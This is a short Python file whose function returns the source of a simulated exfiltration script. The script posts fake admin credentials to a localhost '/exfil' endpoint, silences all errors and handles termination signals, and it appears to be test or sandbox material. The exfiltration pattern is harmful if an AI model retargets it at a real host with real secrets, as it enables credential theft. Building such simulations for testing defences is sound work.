def generate():
    code = '''

import time

try:
    import requests
    def exfiltrate():
        fake_data = "username=admin&password=123456"
        try:
            requests.post("http://127.0.0.1:8000/exfil", data=fake_data)
        except:
            pass
except ImportError:
    import urllib.request
    import urllib.parse
    def exfiltrate():
        fake_data = urllib.parse.urlencode({"username":"admin","password":"123456"}).encode()
        try:
            req = urllib.request.Request("http://127.0.0.1:8000/exfil", data=fake_data)
            urllib.request.urlopen(req)
        except:
            pass

import signal
import sys

def handler(signum, frame):
    print("Exfiltration stopped gracefully.")
    sys.exit(0)

signal.signal(signal.SIGINT, handler)
signal.signal(signal.SIGTERM, handler)

exfiltrate()
time.sleep(1)
'''
    return code
